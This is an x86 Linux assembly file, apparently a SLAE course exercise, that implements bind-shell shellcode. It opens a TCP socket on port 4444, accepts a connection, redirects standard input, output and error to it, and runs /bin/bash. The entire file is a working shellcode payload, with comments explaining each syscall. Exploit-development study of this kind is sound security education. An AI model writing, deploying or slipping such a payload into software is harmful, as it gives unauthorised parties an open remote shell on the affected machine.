; Filename: shell_bind_tcp.nasm
; Author:   SLAE-755

global _start

section .text

_start:

; int socket(int domain, int type, int protocol);
;     socket(AF_INET, SOCK_STREAM, 0);
;     socket(2, 1, 0)
;

; EAX = socket() 	-> 359
; EBX = AF_INET  	-> 2
; ECX = SOCK_STREAM 	-> 1


xor eax, eax
mov ebx, eax
mov ecx, eax
mov edx, eax

mov ax, 0x167 ; 359 in decimal
mov bl, 0x2
inc cl

int 0x80
mov ebx, eax  ; storing the socket descriptor into EBX for next syscall




;int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
;    bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));
;    bind(socket, [2, 4444, 0], 16)
;

; EAX = 0x169        	-> 361 in decimal (bind)
; ECX = mysocketaddr	-> point to data struct
; EDX = 0x10		-> 16 in decimal

xor eax, eax
mov edx, eax
mov ax, 0x169 		; 361 in decimal

xor ecx, ecx
push ecx		; pushing 32 bit INADDR_ANY

push word 0x5c11	; pushing htons(PORT 4444)
push word 0x2		; pushing AF_INET as sin_family

mov ecx, esp
mov dl, 0x10

int 0x80


;int listen(int sockfd, int backlog);
;    listen(sockfd, 0);
;

; EAX = 0x16b           -> 363 in decimal (listen)

xor ecx, ecx
xor eax, eax
mov ax, 0x16b

int 0x80


;int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
;    If flags is 0, then accept4() is the same as accept()
;    accept(socket, 0, 0, 0);

xor esi, esi
xor eax, eax
mov ax, 0x16c	;364

cdq		; Zeroing EDX
push edx

mov ecx, esp
mov edx, esp

int 0x80

mov ebx, eax	;save the new socket descriptor



;redirect standard input, output, and error to the newly accepted socket descriptor.
;int dup2(int oldfd, int newfd);
;    dup2(client_sock, X)

xor ecx, ecx
mov cl, 0x2

mov al, 0x3F	; 63 in decimal
int 0x80	; duplicating file descriptor 2

dec ecx

mov al, 0x3F	; 63 in decimal
int 0x80	; duplicating file descriptor 1

dec ecx

mov al, 0x3F	; 63 in decimal
int 0x80	; duplicating file descriptor 0


;int execve(const char *path, char *const argv[], char *const envp[]);

; PUSH the first null dword 
xor eax, eax
push eax

; PUSH ////bin/bash (12) 

push 0x68736162
push 0x2f6e6962
push 0x2f2f2f2f

; PUSH //bin/sh (8 bytes) 

;	push 0x68732f2f
;	push 0x6e69622f


mov ebx, esp

push eax
mov edx, esp

push ebx
mov ecx, esp


mov al, 11
int 0x80




